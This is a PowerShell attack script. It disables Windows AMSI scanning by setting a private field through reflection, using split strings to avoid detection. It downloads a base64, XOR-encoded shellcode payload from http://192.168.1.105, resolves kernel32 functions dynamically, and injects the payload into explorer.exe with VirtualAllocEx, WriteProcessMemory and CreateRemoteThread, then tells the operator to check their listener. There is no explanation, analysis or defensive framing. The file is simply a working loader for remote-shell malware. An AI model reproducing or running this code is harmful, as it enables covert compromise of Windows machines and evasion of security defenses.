$assembly = ([AppDomain]::CurrentDomain.GetAssemblies)


$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

$processName = "notepad"

$process = Get-Process -Name $processName -ErrorAction SilentlyContinue

$am = "si"
$A = "Am"
$url = "http://192.168.1.105/help.txt" 

$processName
$processId
$processHandle


if ($process) {
    Write-Host "Process found:"
    Write-Host "   Name: $($process.ProcessName)"
    Write-Host "   ID: $($process.Id)"
    Write-Host "   Handle: $($process.Handle)"
} else {
    Write-Host "Process not found"
}


function LookupFunc {
    Param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
    @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
    [Parameter(Position = 1)] [Type] $delType = [Void]
    )
    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('InMemoryModule', $false).
    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',
    [System.MulticastDelegate])
    $type.
    DefineConstructor('RTSpecialName, HideBySig, Public',
    [System.Reflection.CallingConventions]::Standard, $func).
    SetImplementationFlags('Runtime, Managed')
    $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
    SetImplementationFlags('Runtime, Managed')
    return $type.CreateType()
}



try {
    $ams = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $A,$am))

    $mz = $ams.GetField(('am{0}InitFailed' -f $am), 'NonPublic,Static')
    $mz.SetValue($null, $true)

    $webClient = New-Object System.Net.WebClient
    $fileContent = $webClient.DownloadString($url)

    $decodedContent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fileContent))

    $bufStartIndex = $decodedContent.IndexOf("(0")
    $bufEndIndex = $decodedContent.IndexOf(")", $bufStartIndex)

    $bufString = $decodedContent.Substring($bufStartIndex + 1, $bufEndIndex - $bufStartIndex - 1)

    $splittedString = $bufString.Split(",")

    $buf = [byte[]]::new($splittedString.Length)

    for ($i = 0; $i -lt $splittedString.Length; $i++) {
        $byteValue = [byte]($splittedString[$i].Trim() -bxor 0xfa)
        $buf[$i] = $byteValue
        Write-Host "0x$($byteValue.ToString('X2'))," -NoNewline
    }

    $size = $buf.Length;

    <#
    $directory = "C:\SomeDirectory"
    $files = Get-ChildItem -Path $directory -Recurse -File

    foreach ($file in $files) {
        $content = Get-Content -Path $file.FullName

        # Process each line of the file
        foreach ($line in $content) {
            $processedLine = $line.Trim().ToUpper()

            # Check if the line contains a specific keyword
            if ($processedLine -like "*KEYWORD*") {
                Write-Host "Found keyword in $($file.Name): $line"
            }
        }

        # Simulate some delay
        Start-Sleep -Milliseconds 500
    }

    Write-Host "Script execution completed."
    #>

    $procId = (Get-Process explorer).Id


    # C#: IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, procId);
    $hProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll OpenProcess),
      (getDelegateType @([UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke(0x001F0FFF, 0, $procId)

    # C#: IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
    $expAddr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAllocEx), 
      (getDelegateType @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, [UInt32]$buf.Length, 0x3000, 0x40)

    # C#: bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
    $procMemResult = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WriteProcessMemory), 
      (getDelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr])([Bool]))).Invoke($hProcess, $expAddr, $buf, [Uint32]$buf.Length, [IntPtr]::Zero)         

    # C#: IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateRemoteThread),
      (getDelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr]))).Invoke($hProcess, [IntPtr]::Zero, 0, $expAddr, 0, [IntPtr]::Zero)

    Write-Host "Injected! Check your listener!"




} catch {
    Write-Host "Error occurred while downloading the file: $($_.Exception.Message)"
}
finally {
   if ($stream) { $stream.Dispose() }
   if ($response) { $response.Dispose() }
   if ($memoryStream) { $memoryStream.Dispose() }
}




